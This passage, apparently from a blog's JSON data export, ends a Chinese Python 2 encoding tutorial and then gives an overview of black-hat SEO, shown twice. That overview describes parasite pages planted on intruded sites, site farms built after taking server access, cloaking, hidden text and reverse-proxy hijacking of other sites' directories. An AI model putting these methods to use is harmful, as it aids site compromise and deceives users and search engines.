class=\"line\">f=open(<span class=\"string\">\"test.txt\"</span>,<span class=\"string\">\"w\"</span>)</div><div class=\"line\">f.write(a)</div></pre></td></tr></table></figure></p>\n<p>报错异常信息：UnicodeEncodeError: ‘ascii’ codec can’t encode characters in position 0-1……<br>说明：因为ascii不支持中文，而变量a为unicode格式的中文字符串，因此无法进行编码而引发异常。</p>\n<h4 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h4><p>设置系统编码为utf-8或者gbk。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">import sys</div><div class=\"line\">reload(sys)</div><div class=\"line\">sys.setdefaultencoding(<span class=\"string\">'gbk'</span>)</div></pre></td></tr></table></figure></p>\n<p>说明：在windows下将其设置为gbk，在linux在设置为utf-8.</p>\n<h3 id=\"终端编码\"><a href=\"#终端编码\" class=\"headerlink\" title=\"终端编码\"></a>终端编码</h3><p>　　windows下终端指的是控制台，在控制台上输入输出有着其本身的编码格式，如windows控制台输入输出编码都为cp936。原谅我是第一次看到此编码，于是上网查了会，发现其实它就是常见的GBK编码；而linux终端的输入输出编码都为utf-8。如果我们编写的程序，不会再终端输入输出任何内容，则可以忽略此编码，如若不然终端编码将会非常重要。</p>\n<h4 id=\"乱码点\"><a href=\"#乱码点\" class=\"headerlink\" title=\"乱码点\"></a>乱码点</h4><p>我们在终端执行python脚本时，经常会遇到输出中文乱码，而这往往是因为输出的字符串本身编码与控制台编码不一致。<br>实例证明：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div><div class=\"line\">a=<span class=\"string\">\"中文\"</span>  <span class=\"comment\">#定义一个变量，默认为Str，utf-8编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> a</div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">type</span>(a)</div></pre></td></tr></table></figure></p>\n<p>windows控制台输出结果：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">浣犲ソ</div><div class=\"line\">&lt;<span class=\"built_in\">type</span> <span class=\"string\">'str'</span>&gt;</div></pre></td></tr></table></figure></p>\n<p>linux终端输出结果：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">中文</div><div class=\"line\">&lt;<span class=\"built_in\">type</span> <span class=\"string\">'str'</span>&gt;</div></pre></td></tr></table></figure></p>\n<p>造成这种差异的原因在于windows控制台为gbk编码，而变量a本身为utf-8编码。</p>\n<h4 id=\"解决方案-1\"><a href=\"#解决方案-1\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div><div class=\"line\">a=<span class=\"string\">'你好'</span></div><div class=\"line\">b=a.decode(<span class=\"string\">\"utf-8\"</span>).encode(<span class=\"string\">\"gbk\"</span>)</div><div class=\"line\"><span class=\"built_in\">print</span> b</div></pre></td></tr></table></figure>\n<p>将变量a从utf-8编码转换为gbk编码。</p>\n<h3 id=\"python编码\"><a href=\"#python编码\" class=\"headerlink\" title=\"python编码\"></a>python编码</h3><p>　　python2.x从外部获取的内容都是string编码，其内部分为String编码与Unicode编码，而String编码又分为UTF-8，GBK，GB2312等等。因此为了避免不同编码造成的报错，python内部最好都转化为unicode编码，在输出时再转化为str编码 。可以用encode()/decode()函数，将string与unicode编码互换。</p>\n<h4 id=\"触发异常点-1\"><a href=\"#触发异常点-1\" class=\"headerlink\" title=\"触发异常点\"></a>触发异常点</h4><p>基本在于python内部变量编码与控制台编码，或者其他编码相结合时触发。<br>实例证明：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div><div class=\"line\">a=<span class=\"string\">\"中文\"</span>  <span class=\"comment\">#定义一个变量，默认为str，utf-8编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> a</div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">type</span>(a)</div></pre></td></tr></table></figure></p>\n<p>运行结果：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">浣犲ソ</div><div class=\"line\">&lt;<span class=\"built_in\">type</span> <span class=\"string\">'str'</span>&gt;</div></pre></td></tr></table></figure></p>\n<p>　　说明：windows下控制台输入输出都是gbk编码格式，而代码中定义的变量a为str，utf-8格式，所以会出现乱码。如果想创建一个unicode编码字符串的变量，则可以a=u”123”，在双引号前面加上一个u，表示a为unicode编码。</p>\n<h4 id=\"解决方案-2\"><a href=\"#解决方案-2\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div><div class=\"line\">a=<span class=\"string\">'你好'</span></div><div class=\"line\"><span class=\"built_in\">print</span> a.decode(<span class=\"string\">\"utf-8\"</span>).encode(<span class=\"string\">\"gbk\"</span>)</div></pre></td></tr></table></figure>\n<p>　　说明：首先我们定义的变量a是str格式，编码为utf-8的字符串，我们要将之转化为str格式，GBK编码的字符串。在python内部无法直接转化，需要借助decod()与encode()函数。decode()函数先将str格式的字符串a转化为unicode，再将unicode编码为str格式GBK。而在Unix系统下，不存在这个问题，因为都是utf-8编码，不会存在乱码。print语句默认会将unicode编码的字符串，encode为相应系统的str编码并输出（windows下为gbk,unix下为utf-8）,因此不用担心print unicode编码字符串会报错。</p>\n<h3 id=\"源代码编码\"><a href=\"#源代码编码\" class=\"headerlink\" title=\"源代码编码\"></a>源代码编码</h3><p>源代码编码指的是python程序本身的编码，默认为ascii。</p>\n<h4 id=\"触发异常点-2\"><a href=\"#触发异常点-2\" class=\"headerlink\" title=\"触发异常点\"></a>触发异常点</h4><p>　　python程序本身要被解释器解析执行，需要先被转化为二进制代码。而在这过程中容易引发异常，原因同样是ascii不支持中文，因此当python程序中出现中文时，哪怕是注释，也会引发ascii异常。<br>实例证明：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">\"中文\"</span>  <span class=\"comment\">#中文注释</span></div></pre></td></tr></table></figure></p>\n<p>报错：SyntaxError: Non-ASCII character ‘\\xe7’……</p>\n<h4 id=\"解决方案-3\"><a href=\"#解决方案-3\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div></pre></td></tr></table></figure>\n<p>python程序开头加上这句代码，指定python源代码编码格式为utf-8。</p>\n<h3 id=\"文件编码\"><a href=\"#文件编码\" class=\"headerlink\" title=\"文件编码\"></a>文件编码</h3><p>　　文件编码指的是，python程序从文件中获取的内容的编码格式。可以用sys.getfilesystemencoding()函数获取，windows下为mbcs，linux下为utf-8。至于mbcs，是一种多字节编码（没搞很明白）。</p>\n<h4 id=\"触发异常点（读取文件内容）\"><a href=\"#触发异常点（读取文件内容）\" class=\"headerlink\" title=\"触发异常点（读取文件内容）\"></a>触发异常点（读取文件内容）</h4><p>当python程序从文件中获取内容，并输出时，容易触发异常。<br>实例证明：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div><div class=\"line\">f=open(<span class=\"string\">\"test.txt\"</span>,<span class=\"string\">\"r\"</span>)</div><div class=\"line\">content=f.read()</div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">type</span>(content)</div><div class=\"line\"><span class=\"built_in\">print</span> content</div></pre></td></tr></table></figure></p>\n<p>运行结果：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;<span class=\"built_in\">type</span> <span class=\"string\">'str'</span>&gt;</div><div class=\"line\">你好</div></pre></td></tr></table></figure></p>\n<p>　　可以看到windows下，从文件中读取的编码格式为Str，GBK格式（因为控制台输出没有中文乱码）；而在Unix下为Str，Utf-8格式。从输出内容来说，并没有触发异常，然而当这些内容与python程序自身内容相结合时，容易触发异常。</p>\n<h4 id=\"解决方案-4\"><a href=\"#解决方案-4\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h4><p>在windows下，最好将文件内容转为unicode，可以使用codecs：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">f=codecs.open(<span class=\"string\">\"test.txt\"</span>, encoding=<span class=\"string\">'gbk'</span>).read()</div></pre></td></tr></table></figure></p>\n<p>将格式为gbk的文件内容转化为unicode格式，当然也可以直接使用open(“”,”r”).read().decode(“gbk”)</p>\n<h4 id=\"触发异常点（写入文件内容）\"><a href=\"#触发异常点（写入文件内容）\" class=\"headerlink\" title=\"触发异常点（写入文件内容）\"></a>触发异常点（写入文件内容）</h4><p>参考操作系统编码触发异常点，即将中文unicode字符写入文件时，容易触发异常。</p>\n<h4 id=\"解决方案-5\"><a href=\"#解决方案-5\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h4><p>参考操作系统编码解决方案，或者手动将unicode编码转换为str编码。<br>实例证明：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div><div class=\"line\">a=u<span class=\"string\">\"中文\"</span>  <span class=\"comment\">#a为unicode格式编码</span></div><div class=\"line\">f=open(<span class=\"string\">\"test.txt\"</span>,<span class=\"string\">\"w\"</span>)</div><div class=\"line\">f.write(a.encode(<span class=\"string\">\"gbk\"</span>))</div></pre></td></tr></table></figure></p>\n<p>当然如果变量a本身就是Str则不会报错，只是utf-8编码的内容写入windows文件中，显示会乱码。</p>\n<h3 id=\"网页编码\"><a href=\"#网页编码\" class=\"headerlink\" title=\"网页编码\"></a>网页编码</h3><p>　　网页编码，通常在写爬虫的时候经常遇到，再结合系统编码，python编码，文件编码，往往会搞得一团乱。在程序中我们应该分别处理这些编码，在python内部全部转化为unicode。那么网页编码又有哪些格式呢？<br>常见格式：utf-8，gbk，gb2312</p>\n<h4 id=\"触发异常点-3\"><a href=\"#触发异常点-3\" class=\"headerlink\" title=\"触发异常点\"></a>触发异常点</h4><p>还是在于从网页中获取的源码编码与终端编码，甚至python内部编码不一致的情况。<br>实例证明：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!coding=utf-8</span></div><div class=\"line\">import urllib2</div><div class=\"line\">body=urllib2.urlopen(<span class=\"string\">'http://thief.one'</span>).read()</div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">type</span>(body)</div><div class=\"line\"><span class=\"built_in\">print</span> body</div></pre></td></tr></table></figure></p>\n<p>运行结果：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;<span class=\"built_in\">type</span> <span class=\"string\">'str'</span>&gt;</div><div class=\"line\">body中文显示乱码</div></pre></td></tr></table></figure></p>\n<p>说明：这个网站的编码是utf-8，而且python从网页上爬取的内容都为Str格式，在windows控制台下输出会乱码。</p>\n<h4 id=\"解决方案-6\"><a href=\"#解决方案-6\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h4><p>　　依照之前做法，先将其转化为unicode。而相应的正则也可以为unicode编码，如：res=r’’+u”新成员”。可以通过chardet模块判断网页编码类型，返回的是一个带概率的字典。</p>\n<h3 id=\"编码判断\"><a href=\"#编码判断\" class=\"headerlink\" title=\"编码判断\"></a>编码判断</h3><h4 id=\"判断字符串编码\"><a href=\"#判断字符串编码\" class=\"headerlink\" title=\"判断字符串编码\"></a>判断字符串编码</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">isinstance(obj, (str, unicode))</div></pre></td></tr></table></figure>\n<p>返回True或者False</p>\n<h4 id=\"判断网页编码\"><a href=\"#判断网页编码\" class=\"headerlink\" title=\"判断网页编码\"></a>判断网页编码</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">import chardet</div><div class=\"line\">import urllib2</div><div class=\"line\">body=urllib2.urlopen(<span class=\"string\">\"http://thief.one\"</span>).read()</div><div class=\"line\">chardet.detect(body)</div></pre></td></tr></table></figure>\n<p>判断编码格式，会有百分比，一般用来判断网页编码比较好。</p>\n<h4 id=\"判断系统编码\"><a href=\"#判断系统编码\" class=\"headerlink\" title=\"判断系统编码\"></a>判断系统编码</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">print</span> sys.getdefaultencoding()    <span class=\"comment\">#系统默认编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> sys.getfilesystemencoding() <span class=\"comment\">#文件系统编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> locale.getdefaultlocale()   <span class=\"comment\">#系统当前编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> sys.stdin.encoding          <span class=\"comment\">#终端输入编码</span></div><div class=\"line\"><span class=\"built_in\">print</span> sys.stdout.encoding         <span class=\"comment\">#终端输出编码</span></div></pre></td></tr></table></figure>\n<h3 id=\"python2-x编码建议\"><a href=\"#python2-x编码建议\" class=\"headerlink\" title=\"python2.x编码建议\"></a>python2.x编码建议</h3><ul>\n<li>请尽量在Linux系统上编程，综上我们可以知道linux下较windows，编码问题良好很多。</li>\n<li>python代码内部请全部使用unicode编码，在获取外部内容时，先decode为unicode，向外输出时再encode为Str</li>\n<li>在定义变量或者正则时，也定义unicode字符，如a=u”中文”；res=r””+u”正则”。</li>\n</ul>\n<h3 id=\"其他疑难杂症\"><a href=\"#其他疑难杂症\" class=\"headerlink\" title=\"其他疑难杂症\"></a>其他疑难杂症</h3><p>实例一：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">a=<span class=\"string\">\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\"</span></div><div class=\"line\"><span class=\"built_in\">print</span> a</div></pre></td></tr></table></figure></p>\n<p>变量a的内容本身为unicode编码，怎么正常显示输入？<br>解决方案：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">a=<span class=\"string\">\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\"</span> <span class=\"comment\"># unicode转化为中文</span></div><div class=\"line\">b=a.decode(<span class=\"string\">'unicode-escape'</span>)</div><div class=\"line\"><span class=\"built_in\">print</span> b</div></pre></td></tr></table></figure></p>\n<p><hr><br>　　如果阅读完本章，增加了您对python编码问题的认识，那我会感到欣慰，如有python编码上的问题可以在下方留言。<br>　　如果阅读完本章，您仍然不知如何解决python乱码问题，没关系，请继续移步阅读<a href=\"https://github.com/tengzhangchao/Transcode\">Transcode解决python编码问题</a></p>\n<p><em>　　为了能够让您重视，我不得不再次重申：解决python2.x编码问题的关键，在于要明白无论从哪里来的内容，在python内部流通时，都应该先转换为unicode。（python3.x在这方面做了改进，并取得了很好的效果）</em></p>\n<center><em>技术的探索，就好像编织故事一般，其乐趣在于偶尔能够讲述给别人听，并获得一些赞同！</em></center>\n"},{"title":"黑帽SEO之基础知识","date":"2016-10-09T04:11:12.000Z","comments":1,"_content":"\n　 SEO全称为搜索引擎优化，是指通过站内优化、站外优化等方式，提升搜索引擎收录排名。既然有SEO技术，便会有相应的从业人员，他们被称为白帽SEO，专指通过公正SEO手法，帮助提升站点排名的专业人员。\n<!-- more -->　 当然有白便会有黑，由于白帽SEO优化的过程将会十分漫长，一个新站想要获取好的排名，往往需要花上几年时间做优化推广。因此一些想要快速提升自身网站排名的小伙伴，便开始在SEO上研究作弊手法，从而诞生了黑帽SEO。黑帽SEO是指通过作弊手段，让站点快速提升排名的一类SEO技术，或者说是黑客技术，比如说：黑链（暗链）、站群、网站劫持、桥页等，黑帽SEO能够快速提升排名，但毕竟是违规作弊行为，容易被K。\n　 白帽与黑帽的优缺点显而易见，换句话说两者皆不完美，因此便又诞生了灰帽SEO，介于两者之间，既不违规，又可以较快速的提升排名。由于项目需要，最近开始接触一些黑帽SEO的知识，在此总结分享，欢迎指正！\n\n### 黑帽SEO基础概念\n\n#### 域名\n概念：域名由两个或两个以上的词构成，中间由点号分隔开，最右边的那个词称为顶级域名。\n>##### 顶级域名\n我们接触的顶级域名又分为两类：\n1.国家和地区顶级域名，目前200多个国家分配了顶级域名，例如中国是cn，日本是jp等；\n2.国际顶级域名，例如表示工商企业的.com，表示网络提供商的.net，表示非盈利组织的.org等。\n##### 一级域名\n一级域名就是在com net org前加一级，比如：baidu.com，thief.one等。\n##### 二级域名\nnews.baidu.com，tieba.baidu.com等都是二级域名。\n\n#### 泛站群\n##### 泛二级域名站群\n![](/upload_image/20161009/2.png)\n前提：在做域名解析的时候，选择了*\n操作：进入服务器，可以借助泛二级域名建站工具，批量创建二级域名站点，从而实现站群的效果。\n##### 泛端口站群\n![](/upload_image/20161009/1.png)\n操作：先要获得操作目标站点的服务器权限，进入服务器之后，可以使用泛端口站群建设工具，批量创建泛端口站点。主要是在iis里面批量创建站点，绑定站点对应的端口。对于泛端口站点，一定要注意一些重要端口别占用了，否则可以导致服务器出错。一般泛站，用的比较多的是Dedecms程序。\n#### 站中站\n　 就是在权重高的网站中创建一个自己的网站，其实就是添加很多外链，蜘蛛会认为这些网站也是属于高权重网站的内容，因此权重也会比较高。但是由于这种做法太泛滥，导致百度修改了爬虫算法。\n#### 链轮\n![](/upload_image/20161009/3.png)\n　 Y是想要推广的网站，W是自己控制的外部网站，首先可以搞多个网站，一层层外链下去，形成链轮。当想要推广某个网站时，可以在所有外部网站上添加Y的外链。谷歌貌已经对此不友好，百度还可以尝试。\n#### 蜘蛛池\n　 蜘蛛池是一种通过利用大型平台权重来获得搜索引擎收录以及排名的一种程序。原理可以理解为事先创建了一些站群，获取（豢养）了大量搜索引擎蜘蛛。当想要推广一个新的站点时，只需要将该站点以外链的形式添加到站群中，就能吸引蜘蛛爬取收录。\n#### 寄生虫\n　 寄生虫是黑帽SEO常用的一种方法，通过侵入别人网站，植入寄生虫程序，自动生成各种非法页面。之所以叫做寄生虫是因为能够自己触发生成，而不是一次生成，例如在访问网页的时候触发，自动生成页面且形成链轮等。\n<hr>\n### 黑帽SEO作弊手法\nSEO作弊手法不仅仅是为了提升网站排名，也有可能是为了陷害对手网站，降低其排名。\n#### PR劫持\n　 往往是利用301或者302跳转，因为搜索引擎在处理301，302跳转时，把目标URL当做实际收录的URL。\n　 即当从A域名302到B域名，而B域名的PR值比较高时，域名A在更新PR值后，也会显示域名B的PR值，也就是说可以提升A的PR值。利用这一点，可以先将自己网站302跳转到一个PR高的网站，等PR值更新后，取消转向，放上自己的内容，这样可以维持到下一次PR值更新，大概两三个月的时间。\n#### 网站跳转\n详细参考：[黑帽SEO之页面跳转](http://thief.one/2016/10/10/%E9%BB%91%E5%B8%BDSEO%E2%80%94%E2%80%94%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC/)\n#### 隐藏页面\n　 隐藏页面指的是页面使用程序判断访问者是普通用户还是搜索引擎蜘蛛。如果是普通用户，程序返回一个不考虑SEO，只给用户看的页面；如果是搜索引擎蜘蛛，程序就返回一个高度优化的，但是由于优化后无法阅读的页面。\n#### 隐藏文字\n　 隐藏文字指的是网页上用户看不到，但搜索引擎能看到的文字，可以通过改变文字颜色，位置，大小等方式，代码：\n```bash\n<div style=\"display:none\">隐藏文字</div>\npositon:absolute;\nmargin-right:-1000000px;\n```\n#### 垃圾连接\n　 垃圾连接通常指站长为了提高网站排名，去各大论坛网站留言，留下自己的连接，一般通过群发软件完成这一操作。这种手法，容易被过滤掉，一些浏览器的插件或者博客的插件可以自动进行垃圾留言过滤。\n#### 连接农场\n　 链接农场指的是整个网站或者部分网页，没有实质内容，完全是为了交换链接而存在。该页面上全部是链接到其他网站，其他网站再链回来，互相交叉。\n#### 桥页\n　 桥页也称为“门页”，此页面质量很低，充斥着关键字，完全以关键词排名与流量为目标，不考虑用户体验。当用户访问桥页，一般会有两种情况。\n* 页面顶部以大字号连接到其他网站（想要推广的网站），用户因为看不清桥页内容，有时不得不点击连接。\n* 利用页面自动跳转技术。\n\n#### 关键词堆积\n关键词堆积指的是在页面上本来没必要出现关键词的地方反复刻意堆积关键词，提高排名。\n#### 诱饵替换\n诱饵替换指的是作弊者先通过普通关键词制作页面获得排名后，更改为其他内容。\n#### 刷站\n刷站是一种利用程序模拟用户用搜索引擎，搜索某个关键词，然后点击浏览某个网页的行为。\n#### 挂暗链（黑链）\n手法：利用CSS，利用DIV+JS，利用JS等\n作用：利用高权重网站外链来提升自身站点排名。\n详细参考：[黑帽SEO之暗链](http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E6%9A%97%E9%93%BE/)\n#### 网站劫持\n分类：客户端劫持，服务端劫持，快照劫持等\n手法：一般利用js或者php、asp等代码，达到劫持网站，控制跳转以及网页效果呈现的目的。\n作用：利用高权重网站跳转来引流量。\n详细参考：[黑帽SEO之网页劫持](http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E7%BD%91%E9%A1%B5%E5%8A%AB%E6%8C%81/)\n#### 利用高权重网站二级目录\n手法：将一些博彩网页放在高权重网站的二级目录之下。\n作用：提高网站排名，引流量。\n#### 利用高权重网站二级目录反向代理\n　 通过配置nginx/apache等，设置目录代理，将服务器上某个目录代理到自己搭建服务器上的某个目录。\n　 即浏览者在打开*http://thief.one/2016/*目录时，实际访问到的资源是自己服务器上的某个目录（目标服务器会去自己服务器上拿数据），这取决于nginx配置文件的写法。这种手法不需要修改目标服务器网站源码，只需要修改中间件配置文件，不易被删除，不易被发现。\n\n*持续更新.......*\n\n参考：黑帽SEO论坛、SEO实战密码","source":"_posts/黑帽SEO之基础知识.md","raw":"---\ntitle: 黑帽SEO之基础知识\ndate: 2016-10-09 12:11:12\ncomments: true\ntags: 黑帽SEO\ncategories: 技术交流\n---\n\n　 SEO全称为搜索引擎优化，是指通过站内优化、站外优化等方式，提升搜索引擎收录排名。既然有SEO技术，便会有相应的从业人员，他们被称为白帽SEO，专指通过公正SEO手法，帮助提升站点排名的专业人员。\n<!-- more -->　 当然有白便会有黑，由于白帽SEO优化的过程将会十分漫长，一个新站想要获取好的排名，往往需要花上几年时间做优化推广。因此一些想要快速提升自身网站排名的小伙伴，便开始在SEO上研究作弊手法，从而诞生了黑帽SEO。黑帽SEO是指通过作弊手段，让站点快速提升排名的一类SEO技术，或者说是黑客技术，比如说：黑链（暗链）、站群、网站劫持、桥页等，黑帽SEO能够快速提升排名，但毕竟是违规作弊行为，容易被K。\n　 白帽与黑帽的优缺点显而易见，换句话说两者皆不完美，因此便又诞生了灰帽SEO，介于两者之间，既不违规，又可以较快速的提升排名。由于项目需要，最近开始接触一些黑帽SEO的知识，在此总结分享，欢迎指正！\n\n### 黑帽SEO基础概念\n\n#### 域名\n概念：域名由两个或两个以上的词构成，中间由点号分隔开，最右边的那个词称为顶级域名。\n>##### 顶级域名\n我们接触的顶级域名又分为两类：\n1.国家和地区顶级域名，目前200多个国家分配了顶级域名，例如中国是cn，日本是jp等；\n2.国际顶级域名，例如表示工商企业的.com，表示网络提供商的.net，表示非盈利组织的.org等。\n##### 一级域名\n一级域名就是在com net org前加一级，比如：baidu.com，thief.one等。\n##### 二级域名\nnews.baidu.com，tieba.baidu.com等都是二级域名。\n\n#### 泛站群\n##### 泛二级域名站群\n![](/upload_image/20161009/2.png)\n前提：在做域名解析的时候，选择了*\n操作：进入服务器，可以借助泛二级域名建站工具，批量创建二级域名站点，从而实现站群的效果。\n##### 泛端口站群\n![](/upload_image/20161009/1.png)\n操作：先要获得操作目标站点的服务器权限，进入服务器之后，可以使用泛端口站群建设工具，批量创建泛端口站点。主要是在iis里面批量创建站点，绑定站点对应的端口。对于泛端口站点，一定要注意一些重要端口别占用了，否则可以导致服务器出错。一般泛站，用的比较多的是Dedecms程序。\n#### 站中站\n　 就是在权重高的网站中创建一个自己的网站，其实就是添加很多外链，蜘蛛会认为这些网站也是属于高权重网站的内容，因此权重也会比较高。但是由于这种做法太泛滥，导致百度修改了爬虫算法。\n#### 链轮\n![](/upload_image/20161009/3.png)\n　 Y是想要推广的网站，W是自己控制的外部网站，首先可以搞多个网站，一层层外链下去，形成链轮。当想要推广某个网站时，可以在所有外部网站上添加Y的外链。谷歌貌已经对此不友好，百度还可以尝试。\n#### 蜘蛛池\n　 蜘蛛池是一种通过利用大型平台权重来获得搜索引擎收录以及排名的一种程序。原理可以理解为事先创建了一些站群，获取（豢养）了大量搜索引擎蜘蛛。当想要推广一个新的站点时，只需要将该站点以外链的形式添加到站群中，就能吸引蜘蛛爬取收录。\n#### 寄生虫\n　 寄生虫是黑帽SEO常用的一种方法，通过侵入别人网站，植入寄生虫程序，自动生成各种非法页面。之所以叫做寄生虫是因为能够自己触发生成，而不是一次生成，例如在访问网页的时候触发，自动生成页面且形成链轮等。\n<hr>\n### 黑帽SEO作弊手法\nSEO作弊手法不仅仅是为了提升网站排名，也有可能是为了陷害对手网站，降低其排名。\n#### PR劫持\n　 往往是利用301或者302跳转，因为搜索引擎在处理301，302跳转时，把目标URL当做实际收录的URL。\n　 即当从A域名302到B域名，而B域名的PR值比较高时，域名A在更新PR值后，也会显示域名B的PR值，也就是说可以提升A的PR值。利用这一点，可以先将自己网站302跳转到一个PR高的网站，等PR值更新后，取消转向，放上自己的内容，这样可以维持到下一次PR值更新，大概两三个月的时间。\n#### 网站跳转\n详细参考：[黑帽SEO之页面跳转](http://thief.one/2016/10/10/%E9%BB%91%E5%B8%BDSEO%E2%80%94%E2%80%94%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC/)\n#### 隐藏页面\n　 隐藏页面指的是页面使用程序判断访问者是普通用户还是搜索引擎蜘蛛。如果是普通用户，程序返回一个不考虑SEO，只给用户看的页面；如果是搜索引擎蜘蛛，程序就返回一个高度优化的，但是由于优化后无法阅读的页面。\n#### 隐藏文字\n　 隐藏文字指的是网页上用户看不到，但搜索引擎能看到的文字，可以通过改变文字颜色，位置，大小等方式，代码：\n```bash\n<div style=\"display:none\">隐藏文字</div>\npositon:absolute;\nmargin-right:-1000000px;\n```\n#### 垃圾连接\n　 垃圾连接通常指站长为了提高网站排名，去各大论坛网站留言，留下自己的连接，一般通过群发软件完成这一操作。这种手法，容易被过滤掉，一些浏览器的插件或者博客的插件可以自动进行垃圾留言过滤。\n#### 连接农场\n　 链接农场指的是整个网站或者部分网页，没有实质内容，完全是为了交换链接而存在。该页面上全部是链接到其他网站，其他网站再链回来，互相交叉。\n#### 桥页\n　 桥页也称为“门页”，此页面质量很低，充斥着关键字，完全以关键词排名与流量为目标，不考虑用户体验。当用户访问桥页，一般会有两种情况。\n* 页面顶部以大字号连接到其他网站（想要推广的网站），用户因为看不清桥页内容，有时不得不点击连接。\n* 利用页面自动跳转技术。\n\n#### 关键词堆积\n关键词堆积指的是在页面上本来没必要出现关键词的地方反复刻意堆积关键词，提高排名。\n#### 诱饵替换\n诱饵替换指的是作弊者先通过普通关键词制作页面获得排名后，更改为其他内容。\n#### 刷站\n刷站是一种利用程序模拟用户用搜索引擎，搜索某个关键词，然后点击浏览某个网页的行为。\n#### 